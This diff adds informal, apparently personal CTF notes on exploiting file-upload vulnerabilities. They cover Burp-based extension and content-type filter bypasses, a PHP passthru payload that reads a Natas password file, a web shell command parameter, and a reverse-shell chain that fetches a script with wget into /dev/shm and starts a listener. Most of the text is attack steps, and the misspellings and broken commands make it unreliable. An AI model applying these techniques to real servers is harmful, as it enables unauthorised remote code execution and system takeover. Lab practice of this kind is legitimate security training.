@@ -1,0 +1,31 @@
+in file uploading vulnerablity first try to uploads file in the webapplication if its uploaded sucessfully than there may be the chance for file 
+uploding vulnerable 
+how to hack open the burp and intercept the prozy usally there will be .jpg or.png file only you can upload if you can upload .php or.xml than you
+you can take remote connection 
+if its filterd than try for secound step cach in burp and try to modey there 
+eg : upload the file with .jpg in browser and and change it to .php in burp or you can can give like this in burp like this img.php.jpg this may be 
+vunlerable if they are trying filter only the last estenstion 
+filename ="test.jpg" to test.php
+contant-type = image/jpg to application/php ==> this may be filtered by  the application
+and remove the picture and type php code like <? php echo passthru('cat /etc/natas_webpass/natas13'); ?>
+
+the third example is try to upload the img file and in the burp edit the contant in middle of the file and try to insret php file in the midle of the 
+hashing file which most of the application does not check 
+eg:file.png.php
+contant type: image/png
+
+image file formate and php code
+
+and run in browser 10.10.10.185/upload.php?c=whomai 
+for reverseshell 
+you can get reverseshell in many ways
+in that one ways is using pyhton
+python -m SimpleHTTPServer
+now download the tcp_pty_bacconect.py using burp 
+1.?c = wget 127.0.0.1:8000/tcp_pty_bacconect.py -0/dev/shm/erv.py
+2.?c=cat /dev/shm/erv.py you should see the file
+than change it to pyhton /dev/shm etc...
+before that make the lisener 
+now go to the python pty folder and 
+type python tcp_pty_shell_handler.py -b 127.0.0.1:1234
+to get the flag root@kali:~#find /home -type f -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null | colum -t
